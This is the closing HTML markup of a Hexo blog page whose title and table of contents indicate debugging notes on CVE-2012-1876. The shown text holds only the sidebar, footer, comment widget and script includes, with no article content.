+                手把手教你构建 C 语言编译器（解释器）学习笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="sakura" />
+            
+              <p class="site-author-name" itemprop="name">sakura</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/eternalsakura" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eternalsakura13@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/sakura1328/activities" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-globe"></i>知乎</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/eternalsakura13" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.uaf.li" title="Murasaki" target="_blank">Murasaki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://admintony.com" title="AdminTony" target="_blank">AdminTony</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ares-x.com" title="AresX" target="_blank">AresX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.hexlt.org" title="hexman" target="_blank">hexman</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://kabeor.github.io" title="kabeor" target="_blank">kabeor</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">2.</span> <span class="nav-text">参考资料</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试环境搭建"><span class="nav-number">3.</span> <span class="nav-text">调试环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#下载"><span class="nav-number">3.1.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windbg符号文件设置"><span class="nav-number">3.2.</span> <span class="nav-text">windbg符号文件设置</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#poc调试"><span class="nav-number">4.</span> <span class="nav-text">poc调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实现漏洞利用"><span class="nav-number">5.</span> <span class="nav-text">实现漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sakura</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://sakura1328.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://eternalsakura13.com/2018/03/10/cve2012_1876/';
+          this.page.identifier = '2018/03/10/cve2012_1876/';
+          this.page.title = '漏洞战争：CVE-2012-1876调试笔记';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://sakura1328.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.4"></script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
